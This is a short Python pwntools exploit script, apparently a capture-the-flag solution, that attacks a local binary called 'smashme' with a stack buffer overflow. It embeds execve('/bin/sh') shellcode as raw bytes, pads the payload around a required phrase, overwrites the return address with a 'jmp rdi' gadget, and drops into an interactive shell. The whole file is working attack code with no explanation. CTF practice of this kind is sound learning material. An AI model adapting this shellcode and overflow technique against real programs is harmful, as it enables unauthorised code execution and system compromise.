#!/usr/bin/python
from pwn import *

context.arch = 'amd64'

p = process('./smashme')
p.recvuntil('Wanna smash?')
raw_input()
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
jmp_rdi = 0x4c4e1b
p.sendline(sc + 'Smash me outside, how bout d' + 'A'*12 + 'a'*(32 - len(sc)) + p64(jmp_rdi))
p.interactive()
